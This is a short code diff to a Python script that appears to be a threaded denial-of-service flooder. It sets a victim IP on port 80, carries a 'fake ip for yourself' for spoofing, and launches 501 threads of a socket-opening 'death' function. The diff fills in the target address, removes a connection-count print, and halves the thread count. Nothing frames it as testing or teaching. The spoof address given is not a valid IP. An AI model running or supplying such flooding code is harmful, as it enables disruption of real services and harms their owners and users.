@@ -3,7 +3,7 @@
 import threading
 import socket
 
-deadboi = '' #ip of vic
+deadboi = '192.168.8.1' #ip of vic
 port = 80
 notmyip = '192.805.9.5' #fake ip for yourself
 
@@ -18,8 +18,8 @@ def death():
         sockboi.close()
         global connections
         connections += 1
-        print(connections)
+        
 
-for i in range(1001):
+for i in range(501):
     threadboi = threading.Thread(target=death)
     threadboi.start()
